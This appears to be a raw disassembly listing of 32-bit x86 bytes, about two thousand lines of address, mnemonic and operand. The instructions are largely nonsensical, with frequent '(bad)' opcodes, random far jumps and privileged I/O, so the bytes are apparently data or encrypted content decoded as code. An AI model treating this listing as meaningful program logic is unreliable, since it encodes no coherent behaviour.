  40500d:	and    eax,0xc83e56bb
  405012:	xchg   ecx,eax
  405013:	dec    esp
  405014:	cmp    ebx,DWORD PTR [edx-0x61]
  405017:	ret    
  405018:	scas   eax,DWORD PTR es:[edi]
  405019:	test   ebx,eax
  40501b:	or     DWORD PTR [edi-0x69],ebx
  40501e:	sub    eax,0xfd27a361
  405023:	cmp    al,0x28
  405025:	jbe    0x405043
  405027:	lea    eax,[eax]
  405029:	cld    
  40502a:	ret    0x7673
  40502d:	adc    eax,0xb7b0b1fc
  405032:	cwde   
  405033:	(bad)  
  405034:	mov    esp,0xf8af88d4
  405039:	mov    WORD PTR [esi+0x57f0e383],?
  40503f:	(bad)  
  405040:	aad    0x8c
  405042:	cmp    bh,bh
  405044:	xor    eax,0x7464d6fa
  405049:	jmp    DWORD PTR [edx-0x7e5a5d68]
  40504f:	ja     0x405052
  405051:	in     eax,0xb9
  405053:	mov    al,ds:0x1bdf1590
  405058:	adc    dh,ch
  40505a:	push   eax
  40505b:	retf   
  40505c:	and    bh,bl
  40505e:	in     al,dx
  40505f:	sti    
  405060:	popf   
  405061:	loop   0x40502b
  405063:	outs   dx,DWORD PTR ds:[esi]
  405064:	push   0x901d0798
  405069:	push   ebx
  40506a:	pop    eax
  40506b:	sub    bh,BYTE PTR [edi]
  40506d:	mov    ch,0x40
  40506f:	push   ds
  405070:	sub    DWORD PTR [ebp-0x77],0x32
  405074:	inc    eax
  405075:	dec    ebp
  405076:	inc    ebp
  405077:	sub    edx,DWORD PTR es:[eax]
  40507a:	nop
  40507b:	mul    DWORD PTR [ebp+esi*4+0x605f08fe]
  405082:	dec    edx
  405083:	push   ss
  405084:	mov    ecx,esi
  405086:	and    esi,DWORD PTR [esi+0x36]
  405089:	jne    0x405023
  40508b:	push   ecx
  40508c:	adc    DWORD PTR [ebx],0x6018e84a
  405092:	sub    ecx,DWORD PTR [edx+0x15]
  405095:	push   edi
  405096:	(bad)  
  405097:	pop    ecx
  405098:	adc    al,al
  40509a:	sub    al,BYTE PTR [esi+ebp*1]
  40509d:	in     al,dx
  40509e:	pop    DWORD PTR [esi-0x65]
  4050a1:	cmp    eax,0xe5921304
  4050a6:	cmp    al,0x37
  4050a8:	leave  
  4050a9:	fcmovu st,st(6)
  4050ab:	add    ebp,esp
  4050ad:	test   eax,0x8cceaf4b
  4050b2:	lods   eax,DWORD PTR ds:[esi]
  4050b3:	pop    es
  4050b4:	sub    ch,0xb2
  4050b7:	ror    bl,cl
  4050b9:	lock adc eax,0xab9c7a82
  4050bf:	sub    al,0x24
  4050c1:	dec    ebp
  4050c2:	loope  0x405049
  4050c4:	jmp    0xba50:0x3d40f192
  4050cb:	sbb    esp,DWORD PTR [edi]
  4050cd:	into   
  4050ce:	dec    ecx
  4050cf:	sbb    al,0x42
  4050d1:	stos   DWORD PTR es:[edi],eax
  4050d2:	ds int 0xb3
  4050d5:	push   ds
  4050d6:	adc    eax,0xc2970d89
  4050db:	sub    DWORD PTR [edx+eiz*2+0x18b8545c],eax
  4050e2:	aas    
  4050e3:	ret    
  4050e4:	pop    ecx
  4050e5:	xchg   edi,eax
  4050e6:	or     ecx,DWORD PTR [edx-0x5f]
  4050e9:	inc    ecx
  4050ea:	enter  0x38b,0x22
  4050ee:	shl    BYTE PTR [edi],cl
  4050f0:	pop    ds
  4050f1:	add    eax,0xff1c9cfc
  4050f6:	xchg   ch,dl
  4050f8:	test   al,0xcd
  4050fa:	mov    ebp,0xd493ee0f
  4050ff:	dec    ebx
  405100:	dec    eax
  405101:	mov    edx,0x1ea3c3e6
  405106:	test   eax,0x38f9c7d0
  40510b:	sub    BYTE PTR [edi-0x4920df76],ah
  405111:	scas   eax,DWORD PTR es:[edi]
  405112:	in     eax,dx
  405113:	dec    ecx
  405114:	adc    BYTE PTR [eax+0x2c],al
  405117:	gs adc al,0x28
  40511a:	bound  edi,QWORD PTR [ebx-0x754454a]
  405120:	mov    esi,0x8794cf52
  405125:	imul   eax,DWORD PTR [eax],0x63
  405128:	mov    BYTE PTR [edx],al
  40512a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40512b:	or     al,0xd7
  40512d:	pusha  
  40512e:	push   ebx
  40512f:	imul   ebx,DWORD PTR [ebp-0x863eada],0x9b54c71d
  405139:	fs int3 
  40513b:	fdivr  DWORD PTR [edi]
  40513d:	std    
  40513e:	mov    al,ds:0xc45b1470
  405143:	cld    
  405144:	pop    esi
  405145:	(bad)  
  405146:	push   ds
  405147:	push   ds
  405148:	sbb    al,0x19
  40514a:	sbb    esi,DWORD PTR [edx-0x46f2892b]
  405150:	inc    edi
  405151:	adc    dl,BYTE PTR [esi+ebx*1-0x65]
  405155:	ja     0x405185
  405157:	mov    ecx,DWORD PTR [ebx+0x24bb6994]
  40515d:	dec    edx
  40515e:	lds    esi,FWORD PTR [eax]
  405160:	ins    DWORD PTR es:[edi],dx
  405161:	jmp    0x743c:0x14e22d1d
  405168:	push   edi
  405169:	rol    BYTE PTR [edi-0x3b],0x53
  40516d:	(bad)  
  40516e:	mov    ebx,0x3e89cf01
  405173:	out    dx,eax
  405174:	rdpmc  
  405176:	mov    edx,0x471a54b6
  40517b:	xchg   ebp,eax
  40517c:	imul   esp,DWORD PTR [ebp+0x42a595],0x76
  405183:	pop    es
  405184:	pop    ds
  405185:	sbb    al,0xe5
  405187:	cmp    BYTE PTR [edx],bl
  405189:	js     0x4051f4
  40518b:	sub    edi,ebp
  40518d:	fisttp QWORD PTR [ebx]
  40518f:	sub    al,0x39
  405191:	rcl    DWORD PTR [edi+0x7a],1
  405194:	test   BYTE PTR [edi+0x66482241],dl
  40519a:	xor    DWORD PTR [esi-0xd9737cd],ebp
  4051a0:	aas    
  4051a1:	pop    edx
  4051a2:	xchg   edx,eax
  4051a3:	mov    ebp,0x81259938
  4051a8:	mov    bh,0xb4
  4051aa:	jno    0x40513d
  4051ac:	add    eax,0xd6ebecc1
  4051b1:	and    cl,BYTE PTR [eax+0x665f55ad]
  4051b7:	xor    ebp,eax
  4051b9:	xchg   ecx,eax
  4051ba:	fwait
  4051bb:	add    al,ch
  4051bd:	push   ebp
  4051be:	jno    0x40519d
  4051c0:	or     bl,BYTE PTR [esi+0x3a]
  4051c3:	dec    ebp
  4051c4:	lock stos BYTE PTR es:[edi],al
  4051c6:	aaa    
  4051c7:	jmp    0xbc6d:0x96bb9ad0
  4051ce:	std    
  4051cf:	loopne 0x4051c2
  4051d1:	pop    ebp
  4051d2:	int3   
  4051d3:	pop    ecx
  4051d4:	imul   esp,DWORD PTR [eax-0x41f53d43],0x36b6b67a
  4051de:	jge    0x405195
  4051e0:	push   ecx
  4051e1:	jo     0x405174
  4051e3:	inc    ebx
  4051e4:	push   ss
  4051e5:	mov    al,0xd0
  4051e7:	xor    bl,BYTE PTR [eax-0x12]
  4051ea:	jb     0x405261
  4051ec:	jnp    0x4051fe
  4051ee:	in     eax,0x3
  4051f0:	cld    
  4051f1:	aad    0xf3
  4051f3:	push   esp
  4051f4:	sub    DWORD PTR [esi-0x23],0xbfbceba9
  4051fb:	cmp    DWORD PTR [ecx-0x5b386a53],ecx
  405201:	push   ds
  405202:	fdiv   DWORD PTR [esi*2+0x6b9c9e79]
  405209:	sub    al,0xd9
  40520b:	lods   eax,DWORD PTR ds:[esi]
  40520c:	jae    0x40527c
  40520e:	ja     0x405287
  405210:	jne    0x40526a
  405212:	neg    BYTE PTR [edx-0x5c5ae707]
  405218:	mov    ds:0xcbec26ec,al
  40521d:	lds    edx,FWORD PTR [edi+0x64affef0]
  405223:	sub    eax,0x1ce928b7
  405228:	sbb    cl,BYTE PTR [esi-0x56ab703d]
  40522e:	scas   eax,DWORD PTR es:[edi]
  40522f:	(bad)  
  405231:	mov    ch,dh
  405233:	add    eax,DWORD PTR [edx-0x4e]
  405236:	pusha  
  405237:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405238:	test   eax,0x674454d7
  40523d:	jp     0x405299
  40523f:	nop
  405240:	cmp    al,BYTE PTR [ebp+0x2fa16f05]
  405246:	inc    esi
  405247:	mov    ds:0x296f26d6,eax
  40524c:	jo     0x405250
  40524e:	fdecstp 
  405250:	jo     0x40528c
  405252:	mov    edi,0xa5e92956
  405257:	dec    eax
  405258:	xor    DWORD PTR [edi-0x50cecd0b],edi
  40525e:	je     0x4052ab
  405260:	sub    esi,DWORD PTR [edi+eiz*4]
  405263:	push   es
  405264:	xchg   ebx,eax
  405265:	pop    esi
  405266:	inc    ebx
  405267:	mov    ebx,0x15a08541
  40526c:	jbe    0x405238
  40526e:	adc    eax,0x79602d9a
  405273:	jnp    0x405242
  405275:	outs   dx,BYTE PTR ds:[esi]
  405276:	push   eax
  405277:	les    esp,FWORD PTR [ebx+0xc]
  40527a:	xchg   edi,eax
  40527b:	addr16 mov edi,0x2a38b30f
  405281:	icebp  
  405282:	pop    esi
  405283:	jmp    0x40523d
  405285:	arpl   WORD PTR ds:0xd2abc264,bp
  40528b:	jg     0x4052d1
  40528d:	xchg   ebp,eax
  40528e:	adc    al,0x67
  405290:	push   ss
  405291:	(bad)  
  405292:	lods   eax,DWORD PTR ds:[esi]
  405293:	sub    al,0x50
  405295:	mov    eax,ds:0xe4438c21
  40529a:	lahf   
  40529b:	cmp    edx,DWORD PTR [ecx]
  40529d:	or     DWORD PTR [eax+0x50],edx
  4052a0:	arpl   WORD PTR [ebx+0x7e],bx
  4052a3:	call   0x95ce:0x3ab67c01
  4052aa:	in     eax,0x68
  4052ac:	aaa    
  4052ad:	push   ecx
  4052ae:	icebp  
  4052af:	cmp    dh,BYTE PTR [eax]
  4052b1:	inc    eax
  4052b2:	ror    bh,1
  4052b4:	es mov ebp,0xa8a8e1df
  4052ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052bb:	shl    BYTE PTR gs:[ebp-0x25c8196e],0xe8
  4052c3:	repz mov eax,ds:0xda7a2de9
  4052c9:	outs   dx,BYTE PTR ds:[esi]
  4052ca:	push   ebx
  4052cb:	jno    0x4052df
  4052cd:	mov    ebp,0x84818b8d
  4052d2:	lods   al,BYTE PTR ds:[esi]
  4052d3:	popf   
  4052d4:	cmp    eax,0xabbb28ce
  4052d9:	or     DWORD PTR [ebx],edi
  4052db:	lahf   
  4052dc:	arpl   WORD PTR [ebx+eax*8-0x25d03972],bp
  4052e3:	es mov esi,0x195c7966
  4052e9:	aas    
  4052ea:	(bad)  
  4052eb:	push   edx
  4052ec:	js     0x405338
  4052ee:	push   ebp
  4052ef:	mov    WORD PTR [edx+eiz*8],ss
  4052f2:	sub    DWORD PTR [ebx-0x3f],ebp
  4052f5:	sbb    BYTE PTR [esi],al
  4052f7:	neg    DWORD PTR [esi+0x123f4790]
  4052fd:	mov    eax,ebp
  4052ff:	aad    0xb8
  405301:	stc    
  405302:	js     0x405316
  405304:	push   esi
  405305:	mov    ebp,DWORD PTR [eax+ebx*4]
  405308:	or     edx,DWORD PTR [eax]
  40530a:	dec    eax
  40530b:	cmp    BYTE PTR [ebx],bl
  40530d:	sbb    ecx,DWORD PTR [ebx]
  40530f:	cmp    BYTE PTR [eax+0x1c],bh
  405312:	(bad)  
  405313:	ja     0x405342
  405315:	xor    ebx,ecx
  405317:	adc    DWORD PTR fs:[eax],esi
  40531a:	rol    BYTE PTR [esp+ecx*2+0x6db1dd3a],1
  405321:	xchg   edi,eax
  405322:	jecxz  0x405319
  405324:	xchg   ebx,eax
  405325:	scas   al,BYTE PTR es:[edi]
  405326:	xchg   esi,eax
  405327:	ins    BYTE PTR es:[edi],dx
  405328:	outs   dx,BYTE PTR ds:[esi]
  405329:	push   esi
  40532a:	mov    edi,0xeed03f62
  40532f:	imul   eax,DWORD PTR [ecx-0x4992a903],0x2d88aa5e
  405339:	test   DWORD PTR [edx-0x3a],esi
  40533c:	mul    ch
  40533e:	xor    BYTE PTR [ebx-0x14],al
  405341:	mov    ebp,0x9b7b93f0
  405346:	scas   eax,DWORD PTR es:[edi]
  405347:	jno    0x4052ca
  405349:	int    0x16
  40534b:	pop    es
  40534c:	neg    DWORD PTR [ebx+0x4b420b8d]
  405352:	(bad)  
  405353:	(bad)  
  405354:	or     DWORD PTR [esi],edi
  405356:	mov    ecx,0xacbb4ed0
  40535b:	mov    ecx,DWORD PTR [ecx-0xe9614db]
  405361:	pop    ebx
  405362:	and    eax,DWORD PTR [edi]
  405364:	jecxz  0x4053d6
  405366:	cli    
  405367:	sub    al,BYTE PTR [ebx]
  405369:	cdq    
  40536a:	adc    eax,0xbaff38a5
  40536f:	outs   dx,BYTE PTR ds:[esi]
  405370:	cwde   
  405371:	pop    ebp
  405372:	into   
  405373:	ficom  DWORD PTR [edx]
  405375:	pop    ds
  405376:	adc    al,0xae
  405378:	push   es
  405379:	cmp    BYTE PTR [esi],ah
  40537b:	add    edi,edx
  40537d:	mov    al,ds:0x15ecf50b
  405382:	mov    al,0x31
  405384:	test   BYTE PTR ds:0xb8cf52b5,ah
  40538a:	jno    0x405311
  40538c:	imul   esp
  40538e:	adc    al,0xdb
  405390:	fimul  WORD PTR [ecx-0x75e93e8a]
  405396:	pop    ebp
  405397:	and    BYTE PTR [eax],cl
  405399:	and    BYTE PTR [eax-0x5d],dh
  40539c:	sub    DWORD PTR [ebp-0x5a869a7d],ebp
  4053a2:	push   ecx
  4053a3:	sbb    eax,0x5ee7f637
  4053a8:	push   ebp
  4053a9:	jecxz  0x4053a5
  4053ab:	jb     0x4053e4
  4053ad:	loope  0x405348
  4053af:	xchg   edx,eax
  4053b0:	pop    edi
  4053b1:	es xchg edi,eax
  4053b3:	mov    fs,WORD PTR [ebp+0x49c41949]
  4053b9:	jns    0x4053e4
  4053bb:	sub    edi,DWORD PTR [edi+0x23]
  4053be:	dec    edx
  4053bf:	outs   dx,BYTE PTR ds:[esi]
  4053c0:	inc    esp
  4053c1:	imul   ecx,DWORD PTR [edi+0x1a],0x467a4dde
  4053c8:	or     eax,DWORD PTR [edi+0x18]
  4053cb:	mov    edi,0x9b95496
  4053d0:	cdq    
  4053d1:	in     al,0xe2
  4053d3:	imul   ebp,eax,0x2f1ee156
  4053d9:	loope  0x405433
  4053db:	mov    ch,0x95
  4053dd:	addr16 jbe 0x4053c7
  4053e0:	test   BYTE PTR [eax+0x46af91f9],al
  4053e6:	pop    eax
  4053e7:	adc    al,0x34
  4053e9:	sbb    eax,eax
  4053eb:	ja     0x40542e
  4053ed:	shr    BYTE PTR [edi+0x4372d9f8],1
  4053f3:	sti    
  4053f4:	and    esi,DWORD PTR [edx-0x3c]
  4053f7:	jmp    0x26b0:0x27f30524
  4053fe:	adc    bh,bh
  405400:	sub    DWORD PTR [esi+0x2270c69e],ebp
  405406:	jge    0x4053b8
  405408:	add    DWORD PTR [edx],esi
  40540a:	enter  0x9556,0x21
  40540e:	(bad)  
  40540f:	popa   
  405410:	push   0xffffffaa
  405412:	xchg   BYTE PTR [ebp-0x6e],cl
  405415:	stc    
  405416:	ret    0xcee3
  405419:	fld    TBYTE PTR [edx+ebx*4]
  40541c:	imul   ebp,ebp,0x4d30c127
  405422:	mov    dl,0xb7
  405424:	icebp  
  405425:	push   0xffffff88
  405427:	adc    edx,0x606722d
  40542d:	(bad)
  405431:	daa    
  405432:	sahf   
  405433:	dec    ebp
  405434:	mov    al,ds:0x501d131c
  405439:	lock xor BYTE PTR [ebx+0x64ec188e],bl
  405440:	icebp  
  405441:	fcomp  st(1)
  405443:	bound  ebx,QWORD PTR [ebx+0x77]
  405446:	xchg   esi,eax
  405447:	jb     0x4053e8
  405449:	test   eax,0x1f998fbf
  40544e:	daa    
  40544f:	inc    ecx
  405450:	sbb    dl,BYTE PTR [esp+ecx*4-0x43]
  405454:	mov    ch,ch
  405456:	fwait
  405457:	dec    ebx
  405458:	js     0x4054d4
  40545a:	and    BYTE PTR [ebx+0x763439bf],bl
  405460:	jo     0x4054ad
  405462:	lods   al,BYTE PTR ds:[esi]
  405463:	(bad)  
  405464:	rol    BYTE PTR [eax-0x72],1
  405467:	das    
  405468:	stc    
  405469:	jl     0x405465
  40546b:	inc    esp
  40546c:	mov    dl,0x67
  40546e:	pushf  
  40546f:	xchg   edx,eax
  405470:	scas   eax,DWORD PTR es:[edi]
  405471:	mov    BYTE PTR ds:0x4cd02eed,0xa1
  405478:	adc    eax,0x64fa20c7
  40547d:	inc    ebp
  40547e:	in     eax,dx
  40547f:	lods   al,BYTE PTR ds:[esi]
  405480:	jmp    0xb03d:0xb6c2bdf9
  405487:	mov    dl,0x25
  405489:	xchg   DWORD PTR [edx],edi
  40548b:	add    DWORD PTR [eax],ebp
  40548d:	or     BYTE PTR [ebx],0x61
  405490:	in     al,0x17
  405492:	jmp    0xec2a:0xff2af489
  405499:	(bad)  
  40549a:	fld    TBYTE PTR [ebp-0x64]
  40549d:	cmp    bh,ah
  40549f:	lds    edi,FWORD PTR [ecx+ebp*8]
  4054a2:	imul   ebp,DWORD PTR [ecx-0x26],0x7
  4054a6:	(bad)  
  4054a7:	mov    al,0x1f
  4054a9:	xchg   BYTE PTR [ecx-0x6166525a],dl
  4054af:	(bad)  
  4054b0:	mov    cl,bh
  4054b2:	ds xchg ebp,eax
  4054b4:	adc    eax,0x5a054ce2
  4054b9:	or     DWORD PTR [ecx+0x463fef28],esp
  4054bf:	mov    ebp,0x73fa969c
  4054c4:	iret   
  4054c5:	adc    eax,0x594b9bea
  4054ca:	mov    al,ds:0xa53a6973
  4054cf:	mov    bl,BYTE PTR [edi-0x77]
  4054d2:	pop    ebp
  4054d3:	mov    ah,dh
  4054d5:	jle    0x4054b8
  4054d7:	pop    ds
  4054d8:	xor    al,0xd0
  4054da:	aaa    
  4054db:	mov    al,0x25
  4054dd:	jmp    0x1789d4b3
  4054e2:	setge  BYTE PTR [esi]
  4054e5:	dec    BYTE PTR [esi]
  4054e7:	sbb    BYTE PTR [eax-0x50],0xea
  4054eb:	push   esp
  4054ec:	in     eax,0x13
  4054ee:	fidiv  DWORD PTR [ebx]
  4054f0:	bound  esp,QWORD PTR [eax]
  4054f2:	ja     0x4054f9
  4054f4:	(bad)  
  4054f5:	cdq    
  4054f6:	push   DWORD PTR [ecx+0x5f]
  4054f9:	mov    al,ds:0xb1db9d1c
  4054fe:	stos   BYTE PTR es:[edi],al
  4054ff:	call   0xd39:0xf6e6266a
  405506:	leave  
  405507:	and    BYTE PTR [eax],bl
  405509:	nop
  40550a:	in     eax,0x67
  40550c:	in     eax,0xe5
  40550e:	or     ebp,0x3858523f
  405514:	(bad)  
  405515:	mov    ?,esp
  405517:	push   esi
  405518:	push   ebx
  405519:	pop    esi
  40551a:	mov    ds:0x2054a316,eax
  40551f:	xchg   edx,eax
  405520:	xchg   ebx,eax
  405521:	out    0x92,al
  405523:	mov    ebx,0x1af0f990
  405528:	(bad)  
  405529:	rcl    BYTE PTR [eax-0x55319212],0xcb
  405530:	xor    BYTE PTR [esi],dl
  405532:	mov    WORD PTR [eax+0x218998f],ss
  405538:	nop
  405539:	mov    dl,0xed
  40553b:	pop    ecx
  40553c:	sub    esi,DWORD PTR [ebx+0x1a]
  40553f:	fwait
  405540:	aad    0x5a
  405542:	pop    ss
  405543:	jae    0x4054ed
  405545:	dec    edx
  405546:	jle    0x40555c
  405548:	inc    ebp
  405549:	xchg   esp,eax
  40554a:	inc    eax
  40554b:	push   ebp
  40554c:	push   cs
  40554d:	fstp   DWORD PTR [esi+esi*8+0x2d687aab]
  405554:	jmp    0xd647fd90
  405559:	add    esi,edi
  40555b:	jnp    0x405572
  40555d:	js     0x40551f
  40555f:	push   esp
  405560:	adc    ebp,esi
  405562:	imul   eax,DWORD PTR [esi],0xf4921468
  405568:	ret    
  405569:	mov    dh,BYTE PTR [ebx-0x3a827db8]
  40556f:	ds add eax,0xf0ee0998
  405575:	cmp    BYTE PTR [ecx],cl
  405577:	jne    0x4055f5
  405579:	mov    ah,BYTE PTR [ecx+0x31516acb]
  40557f:	xor    al,0x47
  405581:	mov    edi,0xba6ed21d
  405586:	test   eax,0x7c1934be
  40558b:	or     BYTE PTR [eax],dh
  40558d:	jnp    0x4055ea
  40558f:	or     al,0x84
  405591:	jnp    0x405543
  405593:	mov    bl,BYTE PTR [esi+0x26933d27]
  405599:	in     al,0x3
  40559b:	cli    
  40559c:	push   edi
  40559d:	add    DWORD PTR [ebx-0x7a],eax
  4055a0:	add    DWORD PTR [esi+esi*2+0x3f8eccc],esi
  4055a7:	dec    edi
  4055a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055a9:	inc    edx
  4055aa:	mov    ds:0xd057378d,eax
  4055af:	sbb    eax,0x5928ffd8
  4055b4:	fmulp  st(1),st
  4055b6:	nop
  4055b7:	div    BYTE PTR [edi]
  4055b9:	push   ds
  4055ba:	scas   eax,DWORD PTR es:[edi]
  4055bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055bc:	cli    
  4055bd:	xchg   edi,eax
  4055be:	ret    0x8eed
  4055c1:	std    
  4055c2:	mov    eax,0xddb0c3e9
  4055c7:	out    dx,al
  4055c8:	pop    ds
  4055c9:	cmc    
  4055ca:	repz xchg ecx,eax
  4055cc:	pop    eax
  4055cd:	(bad)  
  4055cf:	or     ebx,DWORD PTR [ebx-0x31]
  4055d2:	xchg   edx,eax
  4055d3:	fdivr  st(1),st
  4055d5:	jb     0x405599
  4055d7:	std    
  4055d8:	(bad)  
  4055d9:	(bad)  
  4055da:	jmp    0x40564e
  4055dc:	div    DWORD PTR [esi]
  4055de:	aam    0x23
  4055e0:	repnz xchg edi,eax
  4055e2:	inc    esp
  4055e3:	clc    
  4055e4:	sbb    al,BYTE PTR [ecx+0x4fb68129]
  4055ea:	xchg   BYTE PTR [ecx+0x3a],ah
  4055ed:	jge    0x405648
  4055ef:	xlat   BYTE PTR ds:[ebx]
  4055f0:	xchg   ecx,eax
  4055f1:	lock stc 
  4055f3:	iret   
  4055f4:	hlt    
  4055f5:	fistp  QWORD PTR [esi+0x2990aab9]
  4055fb:	or     BYTE PTR [eax+esi*1],0x8e
  4055ff:	mov    ecx,0xf9de510e
  405604:	cs jne 0x4055d5
  405607:	push   eax
  405608:	fdiv   st,st(0)
  40560a:	ins    BYTE PTR es:[edi],dx
  40560b:	sub    WORD PTR ds:0x6b2e0752,bp
  405612:	xchg   ebx,eax
  405613:	add    eax,0x9dd15e59
  405618:	mov    ecx,0x9df917c3
  40561d:	pushf  
  40561e:	fcom   QWORD PTR [edx+eax*2+0x7c]
  405622:	les    ebp,FWORD PTR [esi+0x3f]
  405625:	xchg   esp,eax
  405626:	out    dx,eax
  405627:	repnz add al,0x9c
  40562a:	jmp    0x82cf:0x78f2c191
  405631:	sub    al,0x43
  405633:	call   0x7be5:0x49bfb7db
  40563a:	jmp    0x1d2e:0xcdff2931
  405641:	add    cl,BYTE PTR [ebx-0x15c24c0]
  405647:	jo     0x405697
  405649:	xlat   BYTE PTR ds:[ebx]
  40564a:	rcl    ecx,1
  40564c:	enter  0x9bad,0x92
  405650:	xor    DWORD PTR [ebp+0x7b],edx
  405653:	out    dx,eax
  405654:	push   eax
  405655:	jmp    DWORD PTR [eax-0x3ea47d0d]
  40565b:	sub    BYTE PTR [edx+0x75a11b5e],bl
  405661:	or     eax,0xa2434e71
  405666:	xchg   edx,eax
  405667:	mov    ebp,0xd0628b12
  40566c:	sbb    eax,esi
  40566e:	out    0x90,al
  405670:	pop    eax
  405671:	cmp    al,0x37
  405673:	pop    esp
  405674:	xlat   BYTE PTR ds:[ebx]
  405675:	cdq    
  405676:	and    esp,DWORD PTR [ecx]
  405678:	imul   ecx,edx,0x31e9714a
  40567e:	cmp    esp,DWORD PTR [ecx]
  405680:	mov    DWORD PTR [esi],ecx
  405682:	mov    eax,ds:0x88f7c873
  405687:	call   0x7c791777
  40568c:	xrelease mov DWORD PTR [eax-0x60b37f45],edx
  405693:	js     0x40566b
  405695:	and    dl,BYTE PTR [esi+edx*1-0x59d894c3]
  40569c:	or     dl,BYTE PTR [esi-0x65]
  40569f:	lock test DWORD PTR gs:[ecx+0x5087d4c5],edx
  4056a7:	pop    esp
  4056a8:	cmp    cl,BYTE PTR [edi]
  4056aa:	int3   
  4056ab:	test   DWORD PTR ds:0x877a55a7,ecx
  4056b1:	lds    eax,FWORD PTR [ebx-0x7d]
  4056b4:	xchg   DWORD PTR [edi-0x352e8224],ebx
  4056ba:	mov    ds:0x40e03a7c,al
  4056bf:	pop    DWORD PTR [ebx+0x3]
  4056c2:	dec    esp
  4056c3:	inc    ecx
  4056c4:	(bad)  
  4056c5:	hlt    
  4056c6:	adc    eax,0xd4f3bf38
  4056cb:	push   ecx
  4056cc:	shr    BYTE PTR [ecx+0x6327d3e],0x9a
  4056d3:	pop    ds
  4056d4:	add    dl,dh
  4056d6:	scas   al,BYTE PTR es:[edi]
  4056d7:	out    0xb5,al
  4056d9:	cmp    DWORD PTR [eax],ecx
  4056db:	xor    DWORD PTR [eax],esp
  4056dd:	cld    
  4056de:	push   0x985277c9
  4056e3:	(bad)  
  4056e4:	add    eax,0xe99377fc
  4056e9:	call   FWORD PTR [ecx+0x60f13144]
  4056ef:	pop    es
  4056f0:	cwde   
  4056f1:	stos   BYTE PTR es:[edi],al
  4056f2:	xchg   ebp,eax
  4056f3:	and    eax,0xcadd3bc3
  4056f8:	sbb    eax,0xd6985b9a
  4056fd:	imul   esi,DWORD PTR [esi+0x4b],0x44
  405701:	pop    ebx
  405702:	jmp    0x4056cc
  405704:	xor    eax,0xd749853b
  405709:	xchg   esi,eax
  40570a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40570b:	dec    ecx
  40570c:	popa   
  40570d:	popa   
  40570e:	dec    edi
  40570f:	mov    DWORD PTR [ebp+edi*8+0x2fe126d3],ebp
  405716:	xchg   edx,eax
  405717:	and    BYTE PTR [edx+0x55],ah
  40571a:	ins    BYTE PTR es:[edi],dx
  40571b:	pop    ebx
  40571c:	ja     0x405705
  40571e:	cmp    eax,0x161a0353
  405723:	test   al,0xb1
  405725:	jp     0x4056f0
  405727:	jp     0x4056d7
  405729:	dec    esp
  40572a:	ja     0x40571b
  40572c:	mov    edx,0x9c0ea872
  405731:	add    BYTE PTR [ecx+eiz*2-0x17d4c2c4],dl
  405738:	xchg   BYTE PTR [eax+0x43f5eda8],ah
  40573e:	pop    ecx
  40573f:	(bad)  [ebp-0x64]
  405742:	mov    ds:0xd92bfb0e,al
  405747:	pop    ds
  405748:	mov    bh,0xad
  40574a:	mov    eax,ds:0xa7b63be0
  40574f:	sar    DWORD PTR [esp+edx*8+0x32],0x75
  405754:	dec    ebp
  405755:	into   
  405756:	jbe    0x405798
  405758:	shr    BYTE PTR fs:[edx+ebx*8+0x16d93eb2],1
  405760:	xor    BYTE PTR [ebx-0x54],al
  405763:	pop    esi
  405764:	sub    al,dl
  405766:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405767:	leave  
  405768:	cmp    esi,DWORD PTR ds:0x4f738c00
  40576e:	arpl   WORD PTR [ebx-0x529ee612],cx
  405774:	or     BYTE PTR [esi],cl
  405776:	ss pop ss
  405778:	test   eax,0x54021d9b
  40577d:	xchg   esi,eax
  40577e:	(bad)  
  40577f:	in     eax,0xaf
  405781:	in     al,dx
  405782:	jns    0x405754
  405784:	test   DWORD PTR [edx],edi
  405786:	or     DWORD PTR [ecx+0x7aa22348],esp
  40578c:	xlat   BYTE PTR ds:[ebx]
  40578d:	push   es
  40578e:	push   0x77
  405790:	popf   
  405791:	cli    
  405792:	out    0x8a,al
  405794:	mov    eax,ds:0xb9f719f3
  405799:	jge    0x4057cc
  40579b:	test   esp,edx
  40579d:	pusha  
  40579e:	in     eax,0xc1
  4057a0:	fcmovbe st,st(6)
  4057a2:	push   ebp
  4057a3:	mov    dh,0x42
  4057a5:	ret    
  4057a6:	enter  0x6ae3,0x9f
  4057aa:	lock inc ebx
  4057ac:	stc    
  4057ad:	dec    ecx
  4057ae:	cmp    al,0x69
  4057b0:	fs adc al,0xf2
  4057b3:	sbb    eax,DWORD PTR [ebx]
  4057b5:	clc    
  4057b6:	or     ebx,DWORD PTR [ebx+0x3]
  4057b9:	jnp    0x405791
  4057bb:	or     al,0x36
  4057bd:	inc    esp
  4057be:	aad    0xf4
  4057c0:	xlat   BYTE PTR ds:[ebx]
  4057c1:	fidiv  WORD PTR [edx+0x4d]
  4057c4:	cs scas al,BYTE PTR es:[edi]
  4057c6:	std    
  4057c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057c8:	sbb    eax,0xb73d28c1
  4057cd:	ss hlt 
  4057cf:	cmp    ch,bl
  4057d1:	mov    ds:0x20a75c14,eax
  4057d6:	add    BYTE PTR [ebx+0x79],cl
  4057d9:	cs adc eax,0xcbc1d9d4
  4057df:	sbb    DWORD PTR [ecx+ebp*1],esp
  4057e2:	test   al,0xf1
  4057e4:	outs   dx,BYTE PTR ds:[esi]
  4057e5:	jno    0x4057b1
  4057e7:	jae    0x4057a0
  4057e9:	xor    cl,BYTE PTR [ebp-0x72]
  4057ec:	sti    
  4057ed:	inc    ebx
  4057ee:	or     DWORD PTR [eax-0x15],edx
  4057f1:	mov    bh,0x5
  4057f3:	iret   
  4057f4:	and    al,bh
  4057f6:	loope  0x4057cd
  4057f8:	pop    ss
  4057f9:	je     0x4057b4
  4057fb:	push   ss
  4057fc:	fstp   TBYTE PTR [eax]
  4057fe:	pushf  
  4057ff:	pushf  
  405800:	popa   
  405801:	rcl    BYTE PTR [ebp+0x280bc4a0],cl
  405807:	out    0x21,al
  405809:	and    DWORD PTR [edx-0x611127bc],ebp
  40580f:	xchg   esp,eax
  405810:	xchg   eax,esp
  405812:	(bad)
